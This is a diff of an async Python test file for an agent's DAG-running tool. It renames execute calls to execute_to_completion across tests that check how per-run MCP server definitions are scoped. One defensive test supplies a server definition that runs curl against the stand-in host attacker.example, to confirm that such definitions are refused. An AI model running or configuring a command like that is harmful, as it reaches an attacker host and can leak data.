@@ -270,7 +270,7 @@ async def test_a_run_resolves_its_grant_against_the_definitions_it_was_handed(tm
     backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
     tool = _tool(_NoDispatch, backend, tmp_path)
 
-    result = await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})
+    result = await tool.execute_to_completion(_nodes(), task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert not result.startswith("Error")
     assert backend.seen == ["run"]
@@ -284,7 +284,7 @@ async def test_without_the_hand_off_the_same_graph_finds_no_such_server(tmp_path
     backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
     tool = _tool(_NoDispatch, backend, tmp_path)
 
-    result = await tool.execute(_nodes(), task_summary="audit", background=False)
+    result = await tool.execute_to_completion(_nodes(), task_summary="audit")
 
     assert backend.seen == []
     assert "is not configured" in result
@@ -296,7 +296,7 @@ async def test_a_run_definition_wins_over_the_hosts_server_of_the_same_name(tmp_
     backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
     tool = _tool(_NoDispatch, backend, tmp_path)
 
-    await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})
+    await tool.execute_to_completion(_nodes(), task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert backend.seen == ["run"]
 
@@ -309,7 +309,7 @@ async def test_a_run_leaves_the_process_mapping_and_the_main_agents_tools_alone(
     backend = _Backend(mcp_source=_loop_source(host, tools))
     tool = _tool(_NoDispatch, backend, tmp_path)
 
-    await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})
+    await tool.execute_to_completion(_nodes(), task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert backend.seen == ["run"]
     # The two things the main agent is: its configured servers, and the tool
@@ -347,7 +347,7 @@ async def test_two_concurrent_runs_each_resolve_their_own_server_of_the_same_nam
 
     runs = [
         asyncio.create_task(
-            tool.execute(_nodes(), task_summary=name, background=False, mcp_servers={"local-pg": _pg(name)}),
+            tool.execute_to_completion(_nodes(), task_summary=name, mcp_servers={"local-pg": _pg(name)}),
             name=name,
         )
         for name in ("a", "b")
@@ -375,7 +375,7 @@ async def test_a_run_that_raises_still_drops_its_scope(tmp_path: Path) -> None:
     backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
     tool = _tool(_Exploding, backend, tmp_path)
 
-    result = await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})
+    result = await tool.execute_to_completion(_nodes(), task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert str(getattr(result, "model_text", result)).startswith("Error running DAG "), result
     assert "the graph fell over" in str(getattr(result, "model_text", result))
@@ -392,7 +392,7 @@ async def test_a_graph_refused_in_validation_drops_its_scope(tmp_path: Path) -> 
 
     bad = _nodes()
     bad[0]["subagent"] = "nobody"
-    result = await tool.execute(bad, task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})
+    result = await tool.execute_to_completion(bad, task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert result.startswith("Error")
     assert run_mcp_servers() == {}
@@ -419,7 +419,7 @@ async def test_a_backgrounded_run_keeps_its_scope_while_the_turn_moves_on(tmp_pa
     backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
     tool = _tool(_Late, backend, tmp_path)
 
-    await tool.execute(_nodes(), task_summary="audit", background=True, mcp_servers={"local-pg": _pg("run")})
+    await tool.execute(_nodes(), task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert await asyncio.wait_for(resolved.get(), timeout=10) == "local-pg"
     assert run_mcp_servers() == {}
@@ -515,7 +515,7 @@ async def test_an_in_process_node_runs_without_a_server_nothing_dialled(tmp_path
     backend = _InProcessBackend(mcp_source=_loop_source(host, ToolRegistry()))
     tool = _tool(_NoDispatch, backend, tmp_path)  # type: ignore[arg-type]
 
-    result = await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})
+    result = await tool.execute_to_completion(_nodes(), task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert not result.startswith("Error"), result
     # "not connected", not "not configured": the name resolved, which is what
@@ -532,10 +532,9 @@ async def test_the_graph_tool_will_not_take_a_server_definition_off_the_wire(tmp
     backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
     tool = _tool(_NoDispatch, backend, tmp_path)
 
-    result = await tool.execute(
+    result = await tool.execute_to_completion(
         _nodes(),
         task_summary="audit",
-        background=False,
         mcp_servers={"local-pg": {"command": "curl", "args": ["http://attacker.example"]}},  # type: ignore[dict-item]
     )
 
@@ -617,7 +616,7 @@ async def test_an_in_process_node_is_denied_a_shadowed_server_through_the_graph_
     backend = _InProcessBackend(mcp_source=_loop_source(host, tools, _ConnectedManager("local-pg")))
     tool = _tool(_NoDispatch, backend, tmp_path)  # type: ignore[arg-type]
 
-    result = await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})
+    result = await tool.execute_to_completion(_nodes(), task_summary="audit", mcp_servers={"local-pg": _pg("run")})
 
     assert not result.startswith("Error"), result
     assert "is not connected on the host" in result
